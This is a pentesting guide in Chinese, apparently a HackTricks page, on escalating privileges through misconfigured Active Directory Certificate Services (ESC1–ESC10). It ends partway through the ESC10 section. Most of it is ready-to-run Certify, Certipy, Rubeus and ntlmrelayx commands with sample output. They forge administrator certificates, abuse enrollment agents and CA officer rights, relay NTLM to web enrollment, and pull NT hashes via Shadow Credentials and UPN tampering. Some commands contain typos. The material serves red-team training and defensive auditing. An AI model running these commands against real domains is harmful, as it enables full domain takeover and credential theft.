# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**这是以下文章中关于提升技术部分的摘要：**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **注册权限被 Enterprise CA 授予给低权限用户。**
- **不需要经理批准。**
- **不需要授权人员的签名。**
- **证书模板上的安全描述符过于宽松，允许低权限用户获得注册权限。**
- **证书模板被配置为定义便于身份验证的 EKU：**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **模板允许请求者在 Certificate Signing Request (CSR) 中包含 subjectAltName：**
- Active Directory (AD) 在证书中存在 subjectAltName (SAN) 时，会优先使用 SAN 来进行身份验证。这意味着通过在 CSR 中指定 SAN，可以请求伪装为任何用户（例如域管理员）的证书。是否允许请求者指定 SAN 由证书模板在 AD 中的对象通过 `mspki-certificate-name-flag` 属性指示。该属性是一个位掩码，存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志时，允许请求者指定 SAN。

> [!CAUTION]
> 上述配置允许低权限用户请求带任意 SAN 的证书，从而能够通过 Kerberos 或 SChannel 以任何域主体进行身份验证。

此功能有时被启用以支持产品或部署服务即时生成 HTTPS 或主机证书，或因缺乏理解而被误用。

需要注意的是，使用此选项创建证书会触发警告；但如果复制现有的证书模板（例如启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` 模板）然后修改以包含身份验证 OID，则不会出现该警告。

### Abuse

要 **查找易受攻击的证书模板**，你可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要 **滥用此漏洞以冒充管理员**，可以运行：
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
然后你可以将生成的 **证书转换为 `.pfx`** 格式，并再次使用它通过 **Rubeus 或 certipy 进行身份验证**：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 二进制文件 "Certreq.exe" 和 "Certutil.exe" 可用于生成 PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

可以通过运行以下 LDAP 查询来枚举 AD 林的配置架构中的证书模板，尤其是那些不需要批准或签名、具有 Client Authentication 或 Smart Card Logon EKU 且启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的模板：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 配置错误的证书模板 - ESC2

### 解释

第二种滥用情形是第一种的变体：

1. Enterprise CA 向低权限用户授予注册权限。
2. 对经理批准的要求被禁用。
3. 授权签名的要求被省略。
4. 证书模板上的安全描述符过于宽松，授予低权限用户证书注册权限。
5. **证书模板被定义为包含 Any Purpose EKU 或无 EKU。**

Any Purpose EKU 允许攻击者为任何用途获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以使用与 ESC3 相同的技术来利用这种情形。

没有 EKU 的证书（作为下级 CA 证书）可以被用于任何目的，也可以用来签发新的证书。因此，攻击者可以利用下级 CA 证书在新证书中指定任意 EKU 或字段。

然而，如果下级 CA 未被 `NTAuthCertificates` 对象信任（这是默认设置），则为域身份验证创建的新证书将无法生效。尽管如此，攻击者仍然可以创建具有任意 EKU 和任意证书值的新证书。这些证书可能被滥用来实现广泛的目的（例如代码签名、服务器身份验证等），并可能对网络中其他应用（如 SAML、AD FS 或 IPSec）产生重大影响。

要在 AD Forest 的配置架构中枚举符合此情形的模板，可运行以下 LDAP 查询：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 配置错误的 Enrolment Agent 模板 - ESC3

### 解释

这种情形类似第一个和第二个，但**滥用**了一个**不同的 EKU**（Certificate Request Agent）和**两个不同的模板**（因此有两套要求），

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1)，在 Microsoft 文档中称为 **Enrollment Agent**，允许主体**为另一个用户注册**该**证书**。

该**“enrollment agent”** 在此类**模板**上进行注册，并使用得到的**证书替其他用户对 CSR 进行共签**。然后它将**共签的 CSR 发送**给 CA，注册一个**允许 “enroll on behalf of”** 的**模板**，CA 随后返回一个**属于 “其他” 用户的证书**。

**要求 1：**

- Enterprise CA 向低权限用户授予了 enrollment 权限。
- 省略了经理批准的要求。
- 无需授权签名的要求。
- 证书模板的安全描述符过于宽松，向低权限用户授予了 enrollment 权限。
- 证书模板包含 Certificate Request Agent EKU，使其能够代表其他主体请求其他证书模板。

**要求 2：**

- Enterprise CA 向低权限用户授予了 enrollment 权限。
- 绕过了经理批准。
- 模板的 schema 版本为 1 或大于 2，并且它指定了一个需要 Certificate Request Agent EKU 的 Application Policy Issuance Requirement。
- 证书模板中定义的某个 EKU 允许域认证。
- CA 未对 enrollment agent 应用限制。

### 滥用

你可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来滥用此情形：
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
允许**获取****enrollment agent certificate**的**用户**、允许enrollment **agents**注册的模板，以及enrollment agent可以代表其操作的**帐户**，都可以由企业CA加以限制。可通过打开`certsrc.msc` **snap-in**，**在 CA 上右键单击**，**单击 Properties**，然后**导航**到 “Enrollment Agents” 选项卡实现。

但是，值得注意的是 CA 的**默认**设置是“**Do not restrict enrollment agents**”。当管理员启用对 enrollment agents 的限制并将其设置为“Restrict enrollment agents”时，默认配置仍然非常宽松。它允许**Everyone**以任何身份在所有模板中进行注册。

## 易受攻击的证书模板访问控制 - ESC4

### **说明**

**证书模板**上的**安全描述符**定义了特定**AD 主体**对该模板所拥有的**权限**。

如果**攻击者**拥有必要的**权限**去**更改**某个**模板**并施加在**先前章节**中列出的任何**可利用的错误配置**，则可能促成权限提升。

值得注意的适用于证书模板的权限包括：

- **Owner:** 隐式地授予对对象的控制，允许修改任何属性。
- **FullControl:** 赋予对对象的完全控制权，包括更改任何属性的能力。
- **WriteOwner:** 允许将对象的所有者更改为攻击者可控制的主体。
- **WriteDacl:** 允许调整访问控制，可能将 FullControl 授予攻击者。
- **WriteProperty:** 授权编辑对象的任意属性。

### 滥用

要识别在模板和其他 PKI 对象上具有编辑权限的主体，请使用 Certify 枚举：
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
下面是一个与之前类似的 privesc 示例：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 是指用户对证书模板具有写入权限。比如，可以滥用该权限覆盖证书模板的配置，从而使该模板对 ESC1 易受攻击。

如上路径所示，只有 `JOHNPC` 拥有这些权限，但我们的用户 `JOHN` 对 `JOHNPC` 有新的 `AddKeyCredentialLink` 边。由于该技术与证书相关，我也实现了该攻击，该攻击被称为 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)。下面是 Certipy’s `shadow auto` command 用于检索受害者 NT hash 的一个小预览。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** 可以用单个命令覆盖证书模板的配置。**默认**情况下，**Certipy** 会**覆盖**配置以使其**易受 ESC1 攻击**。我们也可以指定 **`-save-old` 参数来保存旧的配置**，这在我们攻击后**恢复**配置时会很有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 易受攻击的 PKI 对象访问控制 - ESC5

### 说明

基于 ACL 的相互关联关系形成了一个广泛的网络，除了 certificate templates 和 certificate authority 之外，还包括若干对象，这些对象可能影响整个 AD CS 系统的安全。可能显著影响安全的对象包括：

- CA 服务器的 AD 计算机对象，可能通过 S4U2Self 或 S4U2Proxy 等机制被妥协。
- CA 服务器的 RPC/DCOM 服务。
- 位于容器路径 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 下的任何后代 AD 对象或容器。该路径包括但不限于 Certificate Templates container、Certification Authorities container、NTAuthCertificates 对象以及 Enrollment Services Container 等容器和对象。

如果低权限攻击者设法控制了这些关键组件中的任何一个，PKI 系统的安全就可能被破坏。

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 说明

在 [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) 中讨论的主题也涉及 Microsoft 所述的 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志的影响。当该配置在 Certification Authority (CA) 上启用时，允许在任何请求的 **subject alternative name** 中包含 **user-defined values**，包括那些从 Active Directory® 构造的请求。因此，这使得入侵者能够通过任何为域 **authentication** 配置且允许 **unprivileged** 用户注册的模板（例如标准的 User template）进行注册。结果，攻击者可以获取证书，从而以域管理员或域内的任何其他活动实体进行身份验证。

注意：通过在 `certreq.exe` 中使用 `-attrib "SAN:"` 参数（称为 “Name Value Pairs”）将 alternative names 附加到 Certificate Signing Request (CSR) 的方法，与在 ESC1 中利用 SAN 的策略存在差异。这里的区别在于帐户信息的封装方式——它被包含在证书属性（certificate attribute）中，而不是扩展（extension）中。

### 滥用

要验证该设置是否已启用，组织可以使用带有 `certutil.exe` 的以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
该操作本质上利用了 **remote registry access**，因此一种可替代的方法可能是：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
像 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 这样的工具能够检测到此误配置并加以利用：
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
要更改这些设置，假设拥有 **域管理员** 权限或同等权限，可以在任何工作站上执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
要在您的环境中禁用此配置，可以移除该 flag：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 自 2022 年 5 月安全更新之后，新签发的 **证书** 将包含一个 **安全扩展**，该扩展包含 **请求者的 `objectSid` 属性**。对于 ESC1，该 SID 来源于指定的 SAN。然而，对于 **ESC6**，SID 反映的是 **请求者的 `objectSid`**，而不是 SAN。\
> 要利用 ESC6，系统必须易受 ESC10 (Weak Certificate Mappings) 的影响，后者会优先考虑 **SAN 而不是新的安全扩展**。

## 易受攻击的证书颁发机构访问控制 - ESC7

### 攻击 1

#### 说明

证书颁发机构的访问控制通过一组权限来维护，这些权限决定 CA 的操作。这些权限可以通过访问 `certsrv.msc`、对 CA 右键单击、选择 属性，然后切换到 安全 选项卡 来查看。此外，也可以使用 PSPKI 模块通过诸如以下的命令枚举这些权限：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA 管理员” and “证书管理员” respectively.

#### 滥用

在证书颁发机构上拥有 **`ManageCA`** 权限允许主体使用 PSPKI 远程操作设置。这包括切换 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志以允许在任意模板中指定 SAN，这是进行 domain escalation 的关键环节。

可以使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet 来简化此过程，从而在不直接使用 GUI 的情况下进行修改。

拥有 **`ManageCertificates`** 权限可以批准待处理请求，从而有效规避“CA 证书管理员审批”这一防护。

可以结合 **Certify** 和 **PSPKI** 模块来请求、批准并下载证书：
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 攻击 2

#### 说明

> [!WARNING]
> 在**前一次攻击**中，使用了 **`Manage CA`** 权限去**启用** **EDITF_ATTRIBUTESUBJECTALTNAME2** 标志以执行 **ESC6 攻击**，但在 CA 服务（`CertSvc`）重新启动之前，这不会产生任何效果。当用户拥有 `Manage CA` 访问权限时，该用户也被允许**重启该服务**。然而，这**并不意味着该用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，**ESC6 可能在大多数已打补丁的环境中无法开箱即用**。

因此，这里介绍另一种攻击。

前提条件：

- 仅 **`ManageCA` 权限**
- **`Manage Certificates`** 权限（可由 **`ManageCA`** 授予）
- 证书模板 **`SubCA`** 必须**启用**（可由 **`ManageCA`** 启用）

该技术基于这样的事实：具有 `Manage CA` _和_ `Manage Certificates` 访问权限的用户可以**提交失败的证书请求**。证书模板 **`SubCA`** **易受 ESC1 影响**，但**只有管理员**可以在该模板上进行注册。因此，**用户**可以**请求**在 **`SubCA`** 上注册——该请求会被**拒绝**——但随后会由**管理员****签发**。

#### 滥用

你可以通过将你的用户添加为新的 officer 来**授予自己 `Manage Certificates`** 访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以使用 `-enable-template` 参数**在 CA 上启用**。默认情况下，`SubCA` 模板是启用的。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们已满足此攻击的先决条件，我们可以开始通过 **请求基于 `SubCA` 模板的证书**。

**该请求将被拒绝**d, 但我们会保存 private key 并记录 request ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
借助我们的 **`Manage CA` 和 `Manage Certificates`**，我们可以使用 `ca` 命令及 `-issue-request <request ID>` 参数来 **签发失败的证书** 请求。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数**检索已签发的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### 攻击 3 – Manage Certificates Extension Abuse (SetExtension)

#### 解释

除了经典的 ESC7 滥用（启用 EDITF 属性或批准挂起请求）之外，**Certify 2.0** 揭示了一个全新的原语，只需要 Enterprise CA 上的 *Manage Certificates*（亦称 **Certificate Manager / Officer**）角色。

`ICertAdmin::SetExtension` RPC 方法可以由任何持有 *Manage Certificates* 的主体执行。虽然该方法传统上由合法的 CA 用于更新**挂起**请求上的扩展，但攻击者可以滥用它，将一个**非默认**证书扩展（例如自定义的 *Certificate Issuance Policy* OID，比如 `1.1.1.1`）追加到等待批准的请求上。

由于目标模板**没有为该扩展定义默认值**，当请求最终颁发时，CA 不会覆盖攻击者控制的值。因此生成的证书包含攻击者选择的扩展，该扩展可能：

* 满足其他易受影响模板的 Application / Issuance Policy 要求（导致权限提升）。
* 注入额外的 EKUs 或策略，使证书在第三方系统中获得意外的信任。

简而言之，*Manage Certificates* —— 之前被认为是 ESC7 中“较弱”的一半 —— 现在可以在不修改 CA 配置或不需要更严格的 *Manage CA* 权限的情况下，被用于完整的权限提升或长期持久化。

#### 使用 Certify 2.0 滥用该原语

1. **提交一个会保持为 *pending* 的证书请求。** 可以通过需要管理员批准的模板强制实现：
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 使用新的 `manage-ca` 命令**将自定义扩展追加到挂起的请求**：
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*如果模板尚未定义 *Certificate Issuance Policies* 扩展，上述值在颁发后将被保留。*

3. **颁发该请求**（如果你的角色也有 *Manage Certificates* 的批准权限）或等待操作员批准。一旦颁发，下载证书：
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成的证书现在包含恶意的 issuance-policy OID，并可用于后续攻击（例如 ESC13、域权限提升等）。

> 注意：相同的攻击也可以通过 Certipy ≥ 4.7 使用 `ca` 命令和 `-set-extension` 参数执行。

## NTLM Relay 到 AD CS HTTP 端点 – ESC8

### 解释

> [!TIP]
> 在已安装 **AD CS** 的环境中，如果存在一个**易受攻击的 web enrollment endpoint**，并且至少发布了一个允许**域计算机注册和客户端认证**（例如默认的 **`Machine`** 模板）的**certificate template**，那么**任何启用 spooler 服务的计算机都可能被攻击者攻破**！

AD CS 支持若干 **HTTP-based enrollment methods**，通过管理员可能安装的额外服务器角色提供。这些基于 HTTP 的证书注册接口容易受到 **NTLM relay attacks**。攻击者可以从 **被攻陷的机器** 模拟任何通过入站 NTLM 进行身份验证的 AD 帐户。在模拟受害者帐户期间，攻击者可以访问这些 web 接口，使用 `User` 或 `Machine` certificate templates **请求客户端认证证书**。

- **web enrollment interface**（较旧的 ASP 应用，可在 `http://<caserver>/certsrv/` 访问）默认仅使用 HTTP，这不会防御 NTLM relay attacks。此外，它通过其 Authorization HTTP header 明确只允许 NTLM 验证，使得更安全的验证方法（如 Kerberos）无法使用。
- **Certificate Enrollment Service** (CES)、**Certificate Enrollment Policy** (CEP) Web Service 和 **Network Device Enrollment Service** (NDES) 默认通过其 Authorization HTTP header 支持 negotiate 验证。negotiate 验证**同时支持** Kerberos 和 **NTLM**，允许攻击者在中继攻击中**降级到 NTLM** 验证。尽管这些 web 服务默认启用 HTTPS，但单独的 HTTPS **无法防止 NTLM relay attacks**。只有当 HTTPS 与 channel binding 结合时，HTTPS 服务才能免受 NTLM relay attacks 的影响。不幸的是，AD CS 并未在 IIS 上启用 Extended Protection for Authentication，这对于 channel binding 是必需的。

NTLM relay attacks 的一个常见问题是 NTLM 会话的**持续时间短**，以及攻击者无法与**要求 NTLM signing**的服务进行交互。

然而，这一限制可以通过利用 NTLM relay 攻击为用户获取一个证书来克服，因为证书的有效期决定了会话的持续时间，且该证书可用于需要 **NTLM signing** 的服务。有关如何使用被窃取证书的说明，请参见：

{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks 的另一个限制是 **攻击者控制的机器必须被受害者帐户认证**。攻击者可以选择等待或尝试**强制**该认证：

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **滥用**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` 枚举 **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 属性被企业证书颁发机构 (CAs) 用于存储证书注册服务 (CES) 端点。可以使用工具 **Certutil.exe** 解析并列出这些端点：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### 使用 Certify 进行滥用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

默认情况下，Certipy 会基于模板 `Machine` 或 `User` 发起证书请求，具体取决于被中继的账户名是否以 `$` 结尾。可以通过使用 `-template` 参数来指定替代模板。

随后可以使用像 [PetitPotam](https://github.com/ly4k/PetitPotam) 这样的技术来强制进行身份验证。针对域控制器，需要指定 `-template DomainController`。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 无安全扩展 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 解释

新的值 **`CT_FLAG_NO_SECURITY_EXTENSION`**（`0x80000`）用于 **`msPKI-Enrollment-Flag`**，称为 ESC9，阻止在证书中嵌入新的 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展。当 `StrongCertificateBindingEnforcement` 设置为 `1`（默认）时，该标志变得相关，这与设置为 `2` 相反。在可能被利用的较弱证书映射用于 Kerberos 或 Schannel 的情形（如 ESC10）中，其重要性更高，因为缺少 ESC9 并不会改变这些要求。

此标志设置变得重要的条件包括：

- `StrongCertificateBindingEnforcement` 未设置为 `2`（默认是 `1`），或 `CertificateMappingMethods` 包含 `UPN` 标志。
- 证书在 `msPKI-Enrollment-Flag` 设置中被标记了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
- 证书指定了任意 client authentication EKU。
- `GenericWrite` 权限可用于对任意账户执行写入来危及另一个账户。

### 滥用场景

假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是入侵 `Administrator@corp.local`。`Jane@corp.local` 被允许登记的 `ESC9` 证书模板，在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

最初，借助 `John` 的 `GenericWrite`，使用 Shadow Credentials 获取了 `Jane` 的 hash：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
随后，`Jane` 的 `userPrincipalName` 被修改为 `Administrator`，故意省略 `@corp.local` 域部分：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
鉴于 `Administrator@corp.local` 仍然作为 `Administrator` 的 `userPrincipalName` 保持不变，此修改不违反约束。

随后，标记为易受攻击的证书模板 `ESC9` 被以 `Jane` 的身份请求：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
注意到证书的 `userPrincipalName` 显示为 `Administrator`，没有任何 “object SID”。

`Jane` 的 `userPrincipalName` 随后被恢复为她原来的 `Jane@corp.local`：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用已签发的证书尝试进行身份验证现在会返回 `Administrator@corp.local` 的 NT hash。由于证书未指定域，命令必须包含 `-domain <domain>`：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 弱证书映射 - ESC10

### 说明

ESC10 涉及域控制器上的两个注册表键值：

- 在 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 下，`CertificateMappingMethods` 的默认值为 `0x18` (`0x8 | 0x10`)，先前为 `0x1F`。
- 在 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 下，`StrongCertificateBindingEnforcement` 的默认设置为 `1`，先前为 `0`。

**情形 1**

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时。

**情形 2**

如果 `CertificateMappingMethods` 包含 `UPN` 位 (`0x4`)。

### 滥用情形 1

当 `StrongCertificateBindingEnforcement` 配置为 `0` 时，具有 `GenericWrite` 权限的账户 A 可以被利用来攻破任意账户 B。

例如，攻击者对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是攻破 `Administrator@corp.local`。该过程与 ESC9 类似，允许使用任意证书模板。

首先，利用 `GenericWrite`，通过 Shadow Credentials 获取 `Jane` 的哈希。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
随后，将 `Jane` 的 `userPrincipalName` 更改为 `Administrator`，故意省略 `@corp.local` 部分以避免违反约束。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
随后，以 `Jane` 的身份使用默认的 `User` 模板请求了一个启用客户端身份验证的证书。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` 的 `userPrincipalName` 随后被还原为其原始值 `Jane@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用获取到的证书进行认证将会得到 `Administrator@corp.local` 的 NT hash，由于证书中没有域信息，因此在命令中需要指定域。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 滥用案例 2

如果 `CertificateMappingMethods` 包含 `UPN` 位标志（`0x4`），则具有 `GenericWrite` 权限的帐户 A 可以妥协任何缺少 `userPrincipalName` 属性的帐户 B，包括机器帐户和内置域管理员 `Administrator`。

在这里，目标是妥协 `DC$@corp.local`，首先通过 Shadow Credentials 获取 `Jane` 的哈希，利用 `GenericWrite`。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
然后将 `Jane` 的 `userPrincipalName` 设置为 `DC$@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
以 `Jane` 的身份，使用默认的 `User` 模板请求了一个用于客户端身份验证的证书。
```bash
